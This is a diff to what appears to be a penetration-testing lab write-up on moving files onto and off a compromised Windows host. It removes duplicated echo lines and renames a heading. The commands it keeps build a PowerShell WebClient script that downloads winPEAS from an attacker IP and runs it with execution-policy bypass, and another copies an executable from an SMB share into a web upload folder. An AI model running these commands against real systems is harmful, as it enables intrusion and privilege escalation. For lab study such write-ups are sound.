@@ -204,27 +204,15 @@ Obviously, I have Python HTTP server running with **winpeas.exe** on the server.
 ```powershell
 c:\Users\Public>echo $storageDir = $pwd > wget.ps1
 
-echo $storageDir = $pwd > wget.ps1
-
 c:\Users\Public>echo $webclient = New-Object System.Net.WebClient >>wget.ps1
-
-echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 
 c:\Users\Public>echo $url = "http://10.10.16.22:80/winPEASany_ofs.exe" >>wget.ps1
 
-echo $url = "http://10.10.16.22:80/winPEASany_ofs.exe" >>wget.ps1
-
 c:\Users\Public>echo $file = "output-file.exe" >>wget.ps1
-
-echo $file = "output-file.exe" >>wget.ps1
 
 c:\Users\Public>echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
-echo $webclient.DownloadFile($url,$file) >>wget.ps1
-
 c:\Users\Public>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
-
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
 Now I have the file on the box:
@@ -274,7 +262,7 @@ C:\xampp\htdocs\gym\upload>copy \\10.10.14.9\share\c_w c.exe
 ```
 
   
-## Windows -> Linux transfer
+## Windows to Linux transfer
 ### SMB
 We wil frist start a SMB server on our Kali machine:
 
